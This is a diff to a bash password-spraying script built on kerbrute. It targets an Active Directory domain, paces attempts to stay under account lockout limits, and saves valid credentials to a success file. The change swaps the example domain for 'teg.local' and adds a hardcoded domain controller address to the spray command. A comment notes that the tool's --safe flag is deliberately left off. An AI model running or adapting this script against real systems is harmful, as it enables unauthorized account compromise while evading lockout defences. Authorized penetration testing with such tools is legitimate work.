@@ -16,8 +16,8 @@ SUCCESS_FILE="logs/success_credentials.txt"
 ## HELP FUNCTION
 print_help() {
     echo "Usage: $(basename $0) <Domain> <Users file> <Passwords file> <Sleep minutes> <AttemptsPerLockoutPeriod> [KerbrutePath]"
-    echo "Example: $(basename $0) valuecare.local users.txt passwords.txt 15 7"
-    echo "Example: $(basename $0) valuecare.local users.txt passwords.txt 15 7 ./kerbrute_linux_amd64"
+    echo "Example: $(basename $0) teg.local users.txt passwords.txt 15 7"
+    echo "Example: $(basename $0) teg.local users.txt passwords.txt 15 7 ./kerbrute_linux_amd64"
 }
 
 ## INSTALL KERBRUTE IF NOT FOUND
@@ -157,7 +157,7 @@ process_password() {
     echo "=== [Attempt $attempt_count/$total_attempts] Spraying: $password ==="
     
     # Run kerbrute WITHOUT --safe flag (too sensitive) but with conservative settings
-    OUTPUT=$($KERBRUTE_PATH passwordspray -d "$DOMAIN" -t 2 --delay 100 "$USERFILE" "$password" 2>&1)
+    OUTPUT=$($KERBRUTE_PATH passwordspray -d "$DOMAIN" -t 2 --delay 100 "$USERFILE" "$password" --dc 172.29.200.4 2>&1)
     local exit_code=$?
     
     # Check for successful logins
